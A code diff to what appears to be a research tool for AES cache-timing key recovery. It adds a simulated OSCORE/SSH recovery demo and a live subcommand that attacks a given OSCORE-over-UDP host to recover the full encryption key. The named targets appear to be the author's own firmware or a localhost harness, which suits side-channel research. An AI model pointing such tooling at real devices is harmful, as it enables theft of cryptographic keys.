@@ -41,6 +41,14 @@ def cmd_selftest(args):
         pt = bytes(16); ct = aesref.encrypt_blocks(key, np.frombuffer(pt, np.uint8)[None, :])[0].tobytes()
         res = engine.recover(known, t, direction=direction, verify=(pt, ct), truth=target)
         print(f"[selftest {direction}] rk {res.truth_correct}/16  master_ok={res.master == key}  verified={res.verified}")
+    # protocol oracles (OSCORE / SSH) -- flashsim-backed, same last-round attack
+    from .sources import SimulatedProtocolSource
+    from .attack import attack as _attack
+    pt = bytes(16); ct = aesref.encrypt_blocks(key, np.frombuffer(pt, np.uint8)[None, :])[0].tobytes()
+    for proto in ("oscore", "ssh"):
+        cap = SimulatedProtocolSource(proto, DEFAULT_KEY, 40000, sigma=25.0, K=1, R=1, seed=7).capture()
+        rep = _attack(cap, verify=(pt, ct), key_for_truth=key)
+        print(f"[selftest {proto}] master_ok={rep.master_hex == DEFAULT_KEY}  verified={rep.verified}")
 
 
 def _make_target(args):
@@ -104,6 +112,36 @@ def cmd_boot(args):
               + (f"  bruteforced={res.bruteforced}" if res.bruteforced else ""))
 
 
+def cmd_protosim(args):
+    """Hardware-free OSCORE/SSH demo: flashsim timing + optional network jitter,
+    in-device amplification (K) and min-filter over R -> full-key recovery."""
+    from .sources import SimulatedProtocolSource
+    key = bytes.fromhex(args.key)
+    pt = bytes(16); ct = aesref.encrypt_blocks(key, np.frombuffer(pt, np.uint8)[None, :])[0].tobytes()
+    cap = SimulatedProtocolSource(args.proto, args.key, args.n, sigma=args.sigma,
+                                  K=args.K, R=args.R, seed=args.seed_int).capture()
+    rep = engine_attack(cap, verify=(pt, ct), key_for_truth=key)
+    print(f"proto={args.proto} n={args.n} sigma={args.sigma} K={args.K} R={args.R}")
+    print(rep.summary())
+
+
+def cmd_oscore(args):
+    """Live OSCORE-over-UDP attack against fw_f4_oscore (or the local harness in
+    demos/oscore/oscore_localhost.py). Uses the shared wire codecs; by default the
+    oracle is the device cycle field in the reply (a real board would feed a PTP /
+    2nd-MCU timestamp via timing_fn instead). --host-rtt forces the host clock."""
+    from .sources import OscoreNetworkSource
+    from . import protocols
+    key = bytes.fromhex(args.key)
+    tfr = None if args.host_rtt else protocols.oscore_cycles
+    cap = OscoreNetworkSource(args.host, args.port, args.n,
+                              decode_fn=protocols.oscore_decode,
+                              request_fn=protocols.oscore_request,
+                              K=args.K, R=args.R, timing_from_resp=tfr).capture()
+    pt = bytes(16); ct = aesref.encrypt_blocks(key, np.frombuffer(pt, np.uint8)[None, :])[0].tobytes()
+    print(engine_attack(cap, verify=(pt, ct), key_for_truth=key).summary())
+
+
 def cmd_feasibility(args):
     from .transport import collect_oncore
     key = bytes.fromhex(args.key)
@@ -162,6 +200,23 @@ def build_parser():
                        help="AES-192/256: also recover the 2nd-to-last round key -> full master")
         q.add_argument("--line-shift-prev", type=int, default=2,
                        help="round Nr-1 table granularity for --full: 2=T-table (4B entries), 4=S-box")
+    ps = sub.add_parser("protosim", help="hardware-free OSCORE/SSH recovery demo")
+    ps.set_defaults(fn=cmd_protosim)
+    ps.add_argument("--proto", default="oscore", choices=["oscore", "ssh"])
+    ps.add_argument("--n", type=int, default=60000)
+    ps.add_argument("--sigma", type=float, default=25.0, help="network jitter std (cycles)")
+    ps.add_argument("--K", type=int, default=1, help="in-device amplification (repeat encryptions)")
+    ps.add_argument("--R", type=int, default=1, help="min-filter over R network repeats")
+    ps.add_argument("--key", default=DEFAULT_KEY)
+    ps.add_argument("--seed-int", type=int, default=0)
+    oc = sub.add_parser("oscore", help="live OSCORE-over-UDP attack (fw_f4_oscore)")
+    oc.set_defaults(fn=cmd_oscore)
+    oc.add_argument("--host", required=True); oc.add_argument("--port", type=int, default=5683)
+    oc.add_argument("--n", type=int, default=150000)
+    oc.add_argument("--K", type=int, default=1); oc.add_argument("--R", type=int, default=1)
+    oc.add_argument("--key", default=DEFAULT_KEY)
+    oc.add_argument("--host-rtt", action="store_true",
+                    help="time on the host clock instead of the device cycle field")
     b = sub.add_parser("boot"); b.set_defaults(fn=cmd_boot)
     b.add_argument("--port", required=True); b.add_argument("--n", type=int, default=60000)
     b.add_argument("--K", type=int, default=255); b.add_argument("--R", type=int, default=1)
